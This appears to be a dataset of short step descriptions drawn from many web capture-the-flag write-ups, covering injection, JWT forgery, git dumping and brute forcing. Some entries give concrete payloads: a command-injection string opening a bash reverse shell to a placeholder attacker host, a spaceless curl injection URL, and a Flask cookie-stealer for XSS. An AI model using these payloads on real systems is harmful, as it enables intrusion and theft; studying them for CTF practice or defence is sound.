[
    "Used 'php://filter' again.",
    "Located 'flag.txt'.",
    "Note that filename restrictions need to be bypassed to get the flag",
    "Prepared my server for listening with netcat",
    "Set up a netcat listener on my server",
    "Created a payload using python pickle containing a command execution statement",
    "Read the just created payload",
    "Sent the payload to the challenge webpage URL using a POST request",
    "Open the function addCaptcha() in the devtools",
    "Change the HTTP method to POST.",
    "Add 'messi' as a key in the JSON object in the HTTP request.",
    "Change the value of the 'messi' key to 'psg'.",
    "Implemented a logic that changes the cookie flag each time a request is made",
    "Spawn a reverse shell.",
    "Specify the port number.",
    "Run a command to convert the base64 string to ASCII.",
    "Identify the application.",
    "Used a private SSH key retrieved from the database for cloning.",
    "Customize the request body.",
    "Injected '127.0.0.1;bash -c bash -i >& /dev/tcp/<attack-ip-with-netcat-open>/<attacker-netcat-port> 0>&1'.",
    "Attempted to open a reverse shell.",
    "Failed at multiple attempts to get reverse shell.",
    "Attempts to open a reverse shell modified the PHP file.",
    "Search for a way to call a function without parentheses.",
    "Attempt a brute-forcing approach.",
    "Viewed source code and observed 'shell_exec' usage with 'santa_mon.sh' script.",
    "Chose to craft a spaceless command injection payload.",
    "Finalized the payload as 'http://IP:PORT/?command=%22curl${IFS}http://localhost:3000/get_flag%22'.",
    "Replace the JWT token with the admin token.",
    "A Python Flask application, does this in 'xss-cookie-stealer.py'. This script defines one route, '/', which reads the 'c' parameter in the request URL, opens a file called 'cookies.txt', writes the contents of 'c' parameter to that file, and then redirects to 'https://google.com'.",
    "You can run this script anywhere that is internet accessible, port forward port '16361' or deploy on Google Cloud. But, the easiest method is to use ngrok.",
    "Locate the file 'build_flag_checker.yml'",
    "Analyze the contents of 'build_flag_checker.yml'",
    "Open the 'flaghash.sh' script",
    "Write a LaTeX script.",
    "Run Dirb to scan for hidden directories or files",
    "Open the final.txt file in the path",
    "Created a Python script for a brute-force attack on the prefix.",
    "Accessed files such as '.git/HEAD'",
    "Used dumper from GitTools to inspect the git repo",
    "Initiate brute force attack on the token.",
    "Research the hashpumpy function",
    "Extract the source code from /src.tgz.",
    "Or, use Wireshark for analyzing the HTTP traffic.",
    "Utilize the requests library in Python for communication.",
    "Code the script to play the game repeatedly.",
    "Search for the flag within the script's output.",
    "Added a header named 'answer'",
    "Retrieve content of index.php file",
    "Script retrieves all characters.",
    "Implemented a loop in the Python script.",
    "Script iteratively reads the transmissions.",
    "Revealed that a 'vim' command must be used.",
    "Execute the Python script",
    "Sign the JWT with 'dawgCTF?heckin#bamboozle' secret",
    "Calculate the 'passcode'.",
    "Include /var/www/html/flag.php in the POST request",
    "Updated length of URL string according to the previous string replacement.",
    "Retrieve the flag from the file \"flag.txt\".",
    "Craft a URL using the identified character.",
    "Observe the form field requesting an IP address.",
    "Use the 'strings' command to extract the flag from the binary data in the 'print-flag' file.",
    "Use S3Scanner to dump the contents of the suspect S3 bucket",
    "Append the new HMAC signature to the header and payload.",
    "Download the provided PHP files",
    "Find the flag file in the current working directory.",
    "Generate more base64 cookies.",
    "Base64 encode the filenames `index.php` and `getimg.php`.",
    "Pull multiple .git files such as `.git/index`, `.git/config`, `.git/HEAD` etc., from the server.",
    "Identify the debugging private key.",
    "Wrote a request to the root directory",
    "The script reads from '/mydank'",
    "Create a request for '/admin../uberadmin/flag.txt'.",
    "Replace parentheses with backticks in the script",
    "Open the source.zip file.",
    "Import 'io/ioutil'.",
    "Import 'os'.",
    "Obtain an exploit script for generating the payload.",
    "Configure the exploit script with the necessary parameters.",
    "Execute the exploit script to generate the payload.",
    "Construct a curl command to send the payload to the server.",
    "Execute the curl command to send the payload to the server.",
    "Provide an empty array for 'variables'",
    "Utilize hardcoded key.",
    "Highlighted 'ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip'.",
    "Determined that the function `shellme()` is defined in the shared object `shellme.so`.",
    "Utilized the environment to assemble and debug shellcode.",
    "Used the script from https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py",
    "Compose a POST request for the server's login endpoint.",
    "Send the composed POST request via curl.",
    "The 'User-Agent header' showed the admin uses 'Firefox 61.0'",
    "This page is the admin's tool for changing 'user status' to 'premium'",
    "Determine that the length of the flag is 38 characters.",
    "Make the first GET request: 'GET https://yeunote.ctf.yeuchimse.com/note/twitter/3'.",
    "Intercept data between the server and the client.",
    "Gather supporting materials for the exploit",
    "Run the exploit with the specified phar file",
    "Develop a Python script to automate the brute-forcing of characters.",
    "Search for related pull requests on github.",
    "Export or send the content of flag.txt.",
    "Use sqlmap tool.",
    "Apply sqlmap on the saved login request.",
    "Send a post request with the payload for every possible character in the flag.",
    "If a correct character is found (indicated by a read timeout), append the character to the flag and move to the next character.",
    "Utilize the observed character set.",
    "Combine it with the input of three commas to meet the requirement.",
    "Used Burp Suite to intercept the login request",
    "Enclose 'ls' command in backticks.",
    "Add a random rocket name to the POST request body.",
    "Assign 'triton' as the rocket name in the POST request body.",
    "Execute ffuf to fuzz the challenge site.",
    "Utilize the custom wordlist to find more logs.",
    "Found a link for an example json file",
    "Append the current character to the password string.",
    "Trim a section of the server response using slicing.",
    "Launch Python.",
    "Import the 'md5' function from 'hashlib' in Python.",
    "Use the '.lower()' method on the variable to convert the string to lowercase.",
    "Write a Python script to automate the extraction of hidden fields from the website's HTML.",
    "Create a script.",
    "Identify remote address and user agent checks as the reasons.",
    "Determine the need to use '/home/stypr/readflag' on 'website'.",
    "Use Fetch API on 'mobile-viewer' page.",
    "Base64 encode the private key.",
    "Observe the received Base64 encoded string.",
    "Send a POST request to the '/localization-language' endpoint.",
    "Access the GET request arguments through `request.args`",
    "Use a Python script to find `<class 'subprocess.Popen'>` in the subclasses",
    "Create a file 'shell.txt'.",
    "Add the desired payload to 'shell.txt'.",
    "Ensure the file is empty.",
    "Create a file of 1024 bytes with a random name ending in '.txt'.",
    "Retrieved the flag 'CSR{sometimes_it's_really_hard_to_create_good_flags}'.",
    "Created a bash script",
    "Translated the bash script into a one-liner",
    "Ran 'insecure' to obtain a root shell",
    "Encode the payload using Python on the server.",
    "Create a JavaScript script within the HTML page.",
    "Open a window.",
    "Guess a number based on the window's history length.",
    "Specify the number range to be checked.",
    "Wrote a Python script to extract the most commonly occurring source IP (src_ip) from the CSV files",
    "fromCharCode() is utilized to avoid escaping quotes",
    "Utilized the `dirb` wordlist for username enumeration.",
    "Write an exploit script that creates an object with properties : 'username', 'password', '_correctValue' and 'mfa'. 'username' and 'password' are provided. '_correctValue' is set to NULL and 'mfa' is assigned the address of '_correctValue'. This ensures that 'mfa' and '_correctValue' are always identical.",
    "Include the cleaned, manipulated PDF data in 'collision1.pdf'.",
    "Include the cleaned, manipulated PDF data in 'collision2.pdf'.",
    "Invoke the 'render_template_string' function using the SMS message",
    "Trigger the 'add_money_to_login' function through the 'render_template_string' function",
    "Discover list of created books hosted on the server.",
    "Stored the '__proto__' key as ['__proto__'].",
    "Defined final payload using 'wget' and command substitution.",
    "The `run` bash script gives a reverse shell.",
    "Run the binary inside the docker container.",
    "Convert the image to text using OCR.",
    "Use the Runtime.evaluate method for sending the code.",
    "Pay particular attention to rules blocking longer payloads.",
    "Recognized the `onPressed` event handler `api_post`.",
    "Execute a Python script.",
    "Filter output using '/etc/alternatives/nawk'.",
    "Use character substitution to pass argument.",
    "Develop script for indexing and reconstructing.",
    "Create a Python script",
    "Specify an alphabet to iterate over",
    "Launch HTTP POST requests",
    "Include the SQL injection payload in the requests",
    "Experiment with different values in the SQL injection payload",
    "Wrote a script for the attack.",
    "Wrote a script using 'setTimeout' function.",
    "Executed the 'dig' command on 'asdf.jsapi.tech'.",
    "Added the CSS and generated CSS to a GitHub repository.",
    "Craft a file upload request with specific HTML content.",
    "Perform local test using a python command.",
    "Downloaded files from the 'palindromecloudynekos' S3 bucket",
    "Enumerated permissions using 'enumerate-iam' tool",
    "Enumerated permissions using 'pacu' tool",
    "Created a Python script that opens a reverse shell",
    "Initialize for loop.",
    "Set 'user.code' to a random 4-digit number.",
    "Experiment with creating a URL that just hits the length limit",
    "Retrieve source files for AsmBB and FreshLib using wget",
    "Unpack the tar archives",
    "Build the asmbb engine source code using the Fresh IDE with Linux as the target OS",
    "Write PHP payload to '/tmp/pwn.php'.",
    "Noticed that `$var8` is set immediately after `call $dlmalloc`."
]